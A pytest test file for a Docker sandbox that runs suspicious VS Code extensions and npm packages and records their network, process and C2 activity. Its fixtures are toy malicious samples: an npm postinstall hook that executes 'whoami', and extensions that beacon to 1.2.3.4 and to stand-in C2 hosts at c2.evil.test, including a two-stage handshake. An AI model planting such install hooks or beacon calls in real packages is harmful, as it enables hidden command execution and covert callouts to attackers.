# tests/test_sandbox_orchestrator.py
import json
from pathlib import Path

import pytest

from npm_ide_analyst.models import ArtifactType
from npm_ide_analyst.sandbox import orchestrator as orch

pytestmark = pytest.mark.skipif(not orch.docker_available(), reason="docker not available")


@pytest.fixture(scope="module", autouse=True)
def _image():
    orch.build_image()


def test_detonate_vsix_captures_network(tmp_path):
    sample = tmp_path / "ext"
    sample.mkdir()
    (sample / "package.json").write_text(json.dumps({"name": "e", "main": "./extension.js"}))
    (sample / "extension.js").write_text(
        "exports.activate=()=>{require('http').get('http://1.2.3.4/beacon');};",
        encoding="utf-8")
    events = orch.detonate(sample, ArtifactType.EXTENSION, timeout=60)
    assert any(e.kind == "network" and "1.2.3.4" in e.detail for e in events)


def test_detonate_npm_captures_process(tmp_path):
    sample = tmp_path / "pkg"
    sample.mkdir()
    (sample / "package.json").write_text(json.dumps(
        {"name": "p", "scripts": {"postinstall": "node ./evil.js"}}))
    (sample / "evil.js").write_text("require('child_process').exec('whoami');", encoding="utf-8")
    events = orch.detonate(sample, ArtifactType.NPM, timeout=60)
    assert any(e.kind == "process" and "whoami" in e.detail for e in events)


import subprocess as _sp


def test_detonate_sinkhole_captures_multi_request_dialog(tmp_path):
    # The SECOND request is issued only inside the response handler of the first,
    # so it can exist only if a real reply came back — proving a live dialog that
    # the --network none path structurally cannot produce.
    sample = tmp_path / "ext"
    sample.mkdir()
    (sample / "package.json").write_text(json.dumps({"name": "e", "main": "./extension.js"}))
    (sample / "extension.js").write_text(
        "exports.activate=()=>new Promise((resolve)=>{"
        "const http=require('http');"
        "http.get('http://c2.evil.test/a',(res)=>{"
        "  let d='';res.on('data',c=>d+=c);"
        "  res.on('end',()=>{"
        "    http.get('http://c2.evil.test/b?ack='+res.statusCode,(r2)=>{"
        "      r2.on('data',()=>{});r2.on('end',resolve);"
        "    }).on('error',resolve);"
        "  });"
        "}).on('error',resolve);"
        "});",
        encoding="utf-8")
    events = orch.detonate(sample, ArtifactType.EXTENSION, timeout=60, sinkhole=True)
    c2 = " ".join(e.detail for e in events if e.kind == "c2")
    assert "/a" in c2
    assert "/b?ack=200" in c2          # second hop fired after a real 200 reply


def test_detonate_sinkhole_captures_https(tmp_path):
    sample = tmp_path / "ext"
    sample.mkdir()
    (sample / "package.json").write_text(json.dumps({"name": "e", "main": "./extension.js"}))
    (sample / "extension.js").write_text(
        "exports.activate=()=>new Promise((resolve)=>{"
        "require('https').get('https://c2.evil.test/tls',(res)=>{"
        "  res.on('data',()=>{});res.on('end',resolve);"
        "}).on('error',resolve);"
        "});",
        encoding="utf-8")
    events = orch.detonate(sample, ArtifactType.EXTENSION, timeout=60, sinkhole=True)
    assert any(e.kind == "c2" and "/tls" in e.detail for e in events)


def test_sinkhole_teardown_leaves_no_containers_or_networks(tmp_path):
    sample = tmp_path / "ext"
    sample.mkdir()
    (sample / "package.json").write_text(json.dumps({"name": "e", "main": "./extension.js"}))
    (sample / "extension.js").write_text(
        "exports.activate=()=>{require('http').get('http://c2.evil.test/x');};",
        encoding="utf-8")
    orch.detonate(sample, ArtifactType.EXTENSION, timeout=60, sinkhole=True)
    nets = _sp.run(["docker", "network", "ls", "--format", "{{.Name}}"],
                   capture_output=True, text=True, timeout=30).stdout
    ps = _sp.run(["docker", "ps", "-a", "--format", "{{.Names}}"],
                 capture_output=True, text=True, timeout=30).stdout
    assert "analyst-net-" not in nets
    assert "analyst-sink-" not in ps
